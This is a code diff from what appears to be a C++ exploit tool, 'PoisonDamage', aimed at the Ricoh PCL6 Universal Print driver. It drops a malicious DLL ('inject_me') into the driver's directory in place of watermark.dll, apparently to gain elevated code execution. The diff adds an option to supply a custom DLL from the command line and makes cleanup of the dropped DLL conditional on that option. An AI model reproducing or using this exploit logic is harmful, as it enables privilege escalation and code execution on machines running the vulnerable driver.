@@ -94,8 +94,7 @@ namespace
 PoisonDamage::PoisonDamage() :
     Exploit("PCL6 Driver for Universal Print", "PoisonDamage"),
     m_target_directory("C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\"),
-    m_target_dll("watermark.dll"),
-    m_malicious_dll("Dll.dll")
+    m_target_dll("watermark.dll")
 {
 }
 
@@ -105,7 +104,8 @@ PoisonDamage::~PoisonDamage()
 
 bool PoisonDamage::do_exploit()
 {
-    if (!drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
+    // drop inject_me to disk if no command line dll has been provided
+    if (!m_custom_dll && !drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
     {
         return false;
     }
@@ -160,7 +160,10 @@ bool PoisonDamage::do_exploit()
         }
     }
 
-    std::cout << "[+] Cleaning up dropped dll" << std::endl;
-    _unlink(m_malicious_dll.c_str());
+    if (!m_custom_dll)
+    {
+        std::cout << "[+] Cleaning up dropped dll" << std::endl;
+        _unlink(m_malicious_dll.c_str());
+    }
     return true;
 }
